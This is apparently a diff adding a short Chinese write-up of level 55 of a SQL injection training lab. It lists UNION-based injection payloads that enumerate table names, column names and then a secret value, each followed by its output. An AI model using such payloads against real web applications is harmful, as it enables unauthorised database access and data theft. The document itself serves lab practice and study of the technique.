@@ -1,0 +1,19 @@
+第55关
+
+这关通过）闭合
+
+爆出表名
+?id=-1) union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema='challenges'  --+
+qhy9oha8fz
+
+爆出列名
+?id=-1) union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='qhy9oha8fz'  --+
+id,sessid,secret_WHBF,tryy
+
+爆出内容
+?id=-1) union select 1,database(),group_concat(secret_WHBF) from qhy9oha8fz  --+
+n96im9JWocihWFdizGvYoOue
+
+
+
+闯关成功！！！
